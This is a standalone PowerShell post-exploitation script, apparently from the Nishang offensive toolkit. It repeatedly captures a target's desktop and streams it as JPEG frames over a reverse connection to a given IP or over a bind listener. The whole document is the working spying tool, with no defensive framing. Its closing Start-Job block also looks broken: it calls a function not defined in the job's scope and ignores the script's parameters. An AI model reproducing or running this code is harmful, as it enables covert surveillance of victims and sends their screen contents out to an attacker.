<#
.SYNOPSIS
Standalone script to stream a target's desktop using MJPEG (from Nishang).
.DESCRIPTION
This script can be run directly without importing. Accepts the same parameters as Show-TargetScreen function.
#>

[CmdletBinding(DefaultParameterSetName="reverse")]
Param(
    [Parameter(Position = 0, Mandatory = $false, ParameterSetName="reverse")]
    [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
    [String] $IPAddress,

    [Parameter(Position = 1, Mandatory = $false, ParameterSetName="reverse")]
    [Parameter(Position = 1, Mandatory = $false, ParameterSetName="bind")]
    [Int] $Port = 123,

    [Parameter(ParameterSetName="reverse")]
    [Switch] $Reverse,

    [Parameter(ParameterSetName="bind")]
    [Switch] $Bind
)

# Function definition
function Show-TargetScreen
{
    Param(
        [String] $IPAddress,
        [Int] $Port,
        [Switch] $Reverse,
        [Switch] $Bind
    )

    while ($true)
    {
        try
        {
            Add-Type -AssemblyName System.Windows.Forms
            [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream

            if ($Reverse)
            {
                $socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
                $socket.Connect($IPAddress,$Port)
                Write-Verbose "Connected to $IPAddress"
            }

            if ($Bind)
            {
                $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $Port)
                $server = new-object System.Net.Sockets.TcpListener $endpoint
                $server.Start()
                $buffer = New-Object byte[] 1024
                $socket = $server.AcceptSocket()
            }

            function SendResponse($sock, $string)
            {
                if ($sock.Connected)
                {
                    $sock.Send($string) | Out-Null
                }
            }

            function SendStrResponse($sock, $string)
            {
                if ($sock.Connected)
                {
                    $sock.Send([text.Encoding]::Ascii.GetBytes($string)) | Out-Null
                }
            }

            function SendHeader([net.sockets.socket] $sock)
            {
                $response = "HTTP/1.1 200 OK`r`n" +
                            "Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`r`n"
                SendStrResponse $sock $response
            }

            SendHeader $socket

            while ($true)
            {
                $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                $g = [System.Drawing.Graphics]::FromImage($b)
                $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size)
                $g.Dispose()
                $MemoryStream.SetLength(0)
                $b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg))
                $b.Dispose()
                $length = $MemoryStream.Length
                [byte[]] $Bytes = $MemoryStream.ToArray()
        
                $str = "`n`n--boundary`n" +
                       "Content-Type: image/jpeg`n" +
                       "Content-Length: $length`n`n"

                SendStrResponse $socket $str
                SendResponse $socket $Bytes
            }
            $MemoryStream.Close()
        }
        catch
        {
            Write-Warning "Something went wrong! Check if the server is reachable and the port is correct." 
            Write-Error $_
        }
    }
}

Start-Job -ScriptBlock {
    Show-TargetScreen -Port 1234 -Bind
}